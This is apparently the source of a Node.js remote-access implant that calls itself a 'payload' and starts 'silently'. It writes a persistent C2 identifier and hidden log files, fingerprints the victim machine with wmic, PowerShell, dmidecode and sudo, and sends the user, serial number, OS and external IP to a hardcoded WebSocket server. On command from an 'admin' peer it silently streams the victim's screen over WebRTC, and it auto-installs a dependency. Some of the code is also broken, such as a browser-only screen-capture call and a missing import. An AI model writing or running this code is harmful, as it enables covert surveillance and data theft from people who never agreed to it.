const WebSocket = require('ws');
const http = require('http');
const { exec } = require('child_process');
const os = require('os');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const https = require('https');

// --- CONFIGURATION ---
const WS_URL = 'wss://server-eight-pi-39.vercel.app';

// Persistence: Save ID so it reconnects after reboot
const PERSIST_FILE = path.join(os.tmpdir(), '.c2_id');
const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
const LOG_FILE = path.join(LOG_DIR, 'payload.log');
const HIDDEN_LOG_FILE = path.join(os.tmpdir(), '.sys_cache.log');

if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);

// --- LOGGING SYSTEM ---
function log(msg) {
 const timestamp = new Date().toISOString();
 const logLine = `[${timestamp}] ${msg}`;
 console.log(logLine); 
 try { 
   fs.appendFileSync(LOG_FILE, `${logLine}\n`); 
   fs.appendFileSync(HIDDEN_LOG_FILE, `${logLine}\n`); 
 } catch(e) {}
}

function logError(msg, err) {
 const timestamp = new Date().toISOString();
 const errorLine = `[${timestamp}] [ERROR] ${msg}: ${err ? err.message || err : 'Unknown Error'}`;
 console.error(errorLine); 
 try { 
   fs.appendFileSync(LOG_FILE, `${errorLine}\n`); 
   fs.appendFileSync(HIDDEN_LOG_FILE, `${errorLine}\n`); 
 } catch(e) {}
}

log("[INIT] Payload starting silently...");

// --- FORCE INSTALLATION CHECK ---
try {
 const nodeModulesPath = path.join(__dirname, 'node_modules', '@roamhq', 'wrtc');
 if (!fs.existsSync(nodeModulesPath)) {
   log("[FORCE] @roamhq/wrtc missing. Installing...");
   try {
     // Use async install to avoid blocking
     require('child_process').exec('npm install @roamhq/wrtc --save', (err) => {
       if (err) logError("[FORCE] Failed to auto-install @roamhq/wrtc", err);
       else log("[FORCE] Installation complete.");
     });
   } catch (installErr) {
     logError("[FORCE] Failed to auto-install @roamhq/wrtc", installErr);
   }
 }
} catch (e) {
 logError("[FORCE] Could not check/install @roamhq/wrtc", e);
}

// --- NATIVE WEBRTC IMPORTS ---
let wrtc;
try {
 wrtc = require('@roamhq/wrtc');
 log("[WEBRTC] Successfully loaded @roamhq/wrtc");
} catch (e) {
 logError("[WEBRTC] Failed to require @roamhq/wrtc", e);
 wrtc = null;
}

const HAS_WEBRTC = wrtc && wrtc.RTCPeerConnection && wrtc.mediaDevices;
if (!HAS_WEBRTC) {
 log("[WARN] @roamhq/wrtc not loaded properly. Screen sharing may fail.");
}

const { RTCPeerConnection, RTCSessionDescription, MediaStream, mediaDevices } = wrtc || {};

// --- HARDWARE FINGERPRINT ---
function getHardwareFingerprint() {
 const mac = getMacAddress();
 const cpuSerial = getCpuSerial();
 const boardSerial = getBoardSerial();
 return crypto.createHash('sha256').update(mac + cpuSerial + boardSerial).digest('hex').substr(0, 12);
}

function getMacAddress() {
 const interfaces = os.networkInterfaces();
 for (const name of Object.keys(interfaces)) {
   for (const iface of interfaces[name]) {
     if (iface.family === 'IPv4' && !iface.internal) {
       return iface.mac;
     }
   }
 }
 return '00:00:00:00:00:00';
}

function getCpuSerial() {
 try { 
   return execSyncFallback('wmic cpu get processorid', 1, 'unknown_cpu'); 
 } catch (e) {
   try { 
     return execSyncFallback("cat /proc/cpuinfo | grep 'serial number' | awk '{print $3}'", 'unknown_cpu'); 
   } catch (e2) { 
     return 'unknown_cpu'; 
   } 
 }
}

function getBoardSerial() {
 try { 
   return execSyncFallback('wmic baseboard get serialnumber', 1, 'unknown_board'); 
 } catch (e) {
   try { 
     return execSyncFallback("sudo dmidecode -t system | grep 'Serial Number' | awk '{print $3}'", 'unknown_board'); 
   } catch (e2) { 
     return 'unknown_board'; 
   } 
 }
}

// Helper to run sync commands with better error handling
function execSyncFallback(cmd, lineIndex = 0, defaultVal = '') {
  try {
    const { execSync } = require('child_process');
    const output = execSync(cmd).toString().split('\n')[lineIndex].trim();
    return output || defaultVal;
  } catch (e) {
    return defaultVal;
  }
}

// --- ID MANAGEMENT ---
let myId = null;
try {
 if (fs.existsSync(PERSIST_FILE)) {
   const savedId = fs.readFileSync(PERSIST_FILE, 'utf8').trim();
   if (savedId && savedId.length > 0) myId = savedId;
 }
} catch(e) {
 logError("[ID] Error reading persistence file", e);
}

if (!myId) {
 myId = getHardwareFingerprint();
 try { 
   fs.writeFileSync(PERSIST_FILE, myId); 
 } catch(e) {
   logError("[ID] Error writing persistence file", e);
 }
}

log(`[ID] Hardware Fingerprint: ${myId}`);

// --- WEBSOCKET CONNECTION WITH ROBUST RECONNECT ---
let ws = null;
let reconnectAttempts = 0;
let isConnected = false;
let myIp = 'Unknown';

function getExternalIP() {
 return new Promise((resolve) => {
   https.get('https://api.ipify.org?format=json', (res) => {
     let data = '';
     res.on('data', (chunk) => { data += chunk; });
     res.on('end', () => {
       try {
         const json = JSON.parse(data);
         resolve(json.ip);
       } catch (e) {
         resolve('Unknown');
       }
     });
   }).on('error', () => {
     resolve('Unknown');
   });
 });
}

// Async wrapper for exec to prevent blocking
function execAsync(cmd, timeoutMs = 3000) {
  return new Promise((resolve, reject) => {
    const child = exec(cmd, { timeout: timeoutMs }, (error, stdout, stderr) => {
      if (error) {
        resolve(stderr.trim() || stdout.trim() || '');
      } else {
        resolve(stdout.trim());
      }
    });
    
    // Kill process if it takes too long
    setTimeout(() => {
      try { child.kill(); } catch(e){}
    }, timeoutMs);
  });
}

async function initConnection() {
 log(`[WS] Attempting silent connection to ${WS_URL}...`);

 ws = new WebSocket(WS_URL);

 ws.on('error', (err) => {
   logError("[WS] Connection error", err);
   isConnected = false;
 });

 ws.on('open', async () => {
   reconnectAttempts = 0;
   isConnected = true;
   log(`[WS] Connected. Sending identity...`);
   
   // Get Real OS Name and Device Details
   let realOsName = '';
   let realUser = '';
   let realDeviceName = os.hostname() || 'Unknown';
   let realManufacturer = '';
   let realModel = '';
   let realSerialNumber = '';
   let realCpu = '';

   // --- CRITICAL FIX: ASYNCHRONOUS DETECTION ---
   // We run all commands in parallel where possible to speed up detection
   
   if (process.platform === 'win32') {
     
     // Run all Windows queries concurrently
     const [osRes, manRes, modelRes, serialRes, cpuRes, userRes] = await Promise.all([
       execAsync('powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_OperatingSystem).Caption"', 3000),
       execAsync('powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_ComputerSystem).Manufacturer"', 3000),
       execAsync('powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_ComputerSystem).Model"', 3000),
       execAsync('powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_BIOS).SerialNumber"', 3000),
       execAsync('powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_Processor | Select-Object -First 1).Name"', 3000),
       execAsync('powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_ComputerSystem).UserName"', 3000)
     ]);

     realOsName = osRes || ('Windows ' + os.release());
     realManufacturer = manRes || 'Unknown';
     realModel = modelRes || 'Unknown';
     realSerialNumber = serialRes || 'Unknown';
     realCpu = cpuRes || 'Unknown';
     realUser = userRes || (await execAsync('whoami', 2000)).trim() || os.userInfo().username || 'user';

   } else if (process.platform === 'darwin') {

     const [macName, macVersion, macModel, macSerial, macCpu, macUser] = await Promise.all([
       execAsync('sw_vers -productName', 3000),
       execAsync('sw_vers -productVersion', 3000),
       execAsync('sysctl -n hw.model', 3000),
       execAsync("system_profiler SPHardwareDataType | awk -F': ' '/Serial Number/ {print $2; exit}'", 3000),
       execAsync('sysctl -n machdep.cpu.brand_string', 3000),
       execAsync('whoami', 2000)
     ]);

     realOsName = [macName, macVersion].filter(Boolean).join(' ');
     realManufacturer = 'Apple';
     realModel = macModel || 'Unknown';
     realSerialNumber = macSerial || 'Unknown';
     realCpu = macCpu || (os.cpus()[0] && os.cpus()[0].model) || '';
     realUser = macUser.trim() || os.userInfo().username || 'user';

   } else if (process.platform === 'linux') {

     const [distro, vendor, product, serial, linuxUser] = await Promise.all([
       execAsync("grep '^PRETTY_NAME=' /etc/os-release | cut -d= -f2- | tr -d '\"'", 3000),
       execAsync('cat /sys/class/dmi/id/sys_vendor', 3000),
       execAsync('cat /sys/class/dmi/id/product_name', 3000),
       execAsync('cat /sys/class/dmi/id/product_serial', 3000),
       execAsync('whoami', 2000)
     ]);

     realOsName = distro || ('Linux ' + os.release());
     realManufacturer = vendor || 'Unknown';
     realModel = product || 'Unknown';
     realSerialNumber = serial || 'Unknown';
     realCpu = (os.cpus()[0] && os.cpus()[0].model) || '';
     realUser = linuxUser.trim() || os.userInfo().username || 'user';

   } else {
     realOsName = process.platform + ' ' + os.release();
     realCpu = (os.cpus()[0] && os.cpus()[0].model) || '';
     realUser = os.userInfo().username || 'user';
   }

   // Final hardware and system information
   const realRamGB = Number(
     (os.totalmem() / (1024 * 1024 * 1024)).toFixed(2)
   );

   const realCpuCores = os.cpus().length;

   // Get External IP from the connected guest
   myIp = await getExternalIP();

   // Get actual guest computer name
   realDeviceName = os.hostname() || 'Unknown';

   // Send actual guest device information
   safeSend(JSON.stringify({
     type: 'info',
     id: myId,
     uniqueId: myId,
     fingerprint: myId,
     os: realOsName,
     arch: os.arch(),
     user: realDeviceName,
     ip: myIp,
     last_seen: Date.now(),
     status: 'Online',
     serial_number: realSerialNumber || realModel || myId
   }));

   startMonitoring();
 });

 ws.on('message', (msg) => {
   try {
     const data = JSON.parse(msg);
     if (data.type === 'request_join') handleJoinRequest();
     else if (data.type === 'offer') handleOffer(data.sdp);
     else if (data.type === 'answer') handleAnswer(data.sdp);
     else if (data.type === 'candidate') handleCandidate(data.candidate);
   } catch (e) {
     logError("[WS] Message parse error", e);
   }
 });

 ws.on('close', (code, reason) => {
   isConnected = false;
   log(`[WS] Closed. Code: ${code}. Reconnecting in ${(reconnectAttempts + 1) * 5}s...`);
   setTimeout(initConnection, Math.min((reconnectAttempts + 1) * 5000, 30000));
   reconnectAttempts++;
 });
}

function safeSend(msg) {
 if (ws && ws.readyState === WebSocket.OPEN) ws.send(msg);
}

function startMonitoring() {
 setInterval(() => {
   if (isConnected) safeSend(JSON.stringify({ type: 'heartbeat' }));
 }, 30000);
}

// --- WEBRTC (BROWSER NATIVE) ---
let peerConnection = null;
let localStream = null;

async function captureScreenPureJS() {
 if (!peerConnection) {
   peerConnection = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
 }

 const transceivers = peerConnection.getTransceivers();
 transceivers.forEach(t => {
   if (t.sender.track) t.sender.stop();
 });

 try {
   const stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
   stream.getTracks().forEach(track => peerConnection.addTrack(track, stream));

   peerConnection.onicecandidate = (event) => {
     if (event.candidate) safeSend(JSON.stringify({ type: 'candidate', targetId: 'admin', candidate: event.candidate }));
   };

   const offer = await peerConnection.createOffer();
   await peerConnection.setLocalDescription(offer);
   safeSend(JSON.stringify({ type: 'offer', targetId: 'admin', sdp: peerConnection.localDescription }));
 } catch (err) {
   logError("[WEBRTC] Screen capture error", err);
 }
}

function handleJoinRequest() {
 log("[JOIN] Request received. Starting screen share silently...");
 captureScreenPureJS();
}

function handleOffer(offerSDP) {
 if (!peerConnection) peerConnection = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
 peerConnection.setRemoteDescription(new RTCSessionDescription(offerSDP))
   .then(() => peerConnection.createAnswer())
   .then(answer => peerConnection.setLocalDescription(answer))
   .then(() => safeSend(JSON.stringify({ type: 'answer', targetId: 'admin', sdp: peerConnection.localDescription })))
   .catch(err => logError("[WEBRTC] Error handling offer", err));
}

function handleAnswer(answerSDP) {
 if (peerConnection) peerConnection.setRemoteDescription(new RTCSessionDescription(answerSDP)).catch(err => logError("[WEBRTC] Error handling answer", err));
}

function handleCandidate(candidate) {
 if (peerConnection && candidate) peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(err => logError("[WEBRTC] Candidate error", err));
}

// --- HTTP PORT LISTENER (For Render Health) ---
const PORT = Number(process.env.PORT) || 3000;
const server = http.createServer((req, res) => {
 res.writeHead(200, { 'Content-Type': 'application/json' });
 res.end(JSON.stringify({ status: 'ok', service: 'payload', id: myId }));
});

server.listen(PORT, '0.0.0.0', () => {
 log(`[RENDER] HTTP server listening on 0.0.0.0:${PORT}`);
 log('[RENDER] Health service running. Guest registration disabled.');
});

// --- INITIALIZATION ---
initConnection();
